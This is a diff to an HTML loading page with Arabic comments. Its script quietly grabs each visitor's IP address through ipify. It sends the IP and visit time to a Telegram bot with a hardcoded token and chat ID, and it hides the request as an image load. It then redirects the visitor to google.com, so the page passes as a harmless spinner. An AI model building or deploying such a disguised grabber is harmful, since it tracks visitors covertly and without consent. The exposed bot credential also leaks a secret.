@@ -20,6 +20,10 @@
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -29,26 +33,30 @@
     <p>يرجى الانتظار قليلاً.</p>
 
     <script>
+        // رابط الموقع الذي سيتوجه إليه المستخدم بعد تسجيل الأيبيه
         const targetRedirectUrl = "https://www.google.com"; 
+
+        // التوكن والـ Chat ID الجديد الصحيح 100%
         const botToken = "9187574833:AAGIaNeSPMRUCmRtwT_S0jwBS3ubhGf320k"; 
-        const chatId = "4463707354"; 
+        const chatId = "7396302829"; 
 
         function captureAndSend() {
-            // استخدام خدمة بديلة ومستقرة لجلب الـ IP
+            // جلب الـ IP الخاص بالزائر
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const userIp = data.ip;
                     const visitTime = new Date().toLocaleTimeString();
 
+                    // تجهيز رسالة التليجرام
                     const message = encodeURIComponent(`🚨 زيارة جديدة!\n🌐 IP: ${userIp}\n⏰ الوقت: ${visitTime}`);
                     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
 
-                    // إرسال الطلب عبر Image لضمان وصوله حتى لو أغلق المتصفح الصفحة بسرعة
+                    // إرسال البيانات عبر صورة في الخلفية لضمان وصولها
                     const img = new Image();
                     img.src = telegramUrl;
 
-                    // التحويل الفوري بعد جزء من الثانية لضمان إرسال الطلب
+                    // التوجيه للرابط المقصود بعد جزء من الثانية
                     setTimeout(function() {
                         window.location.href = targetRedirectUrl;
                     }, 800);
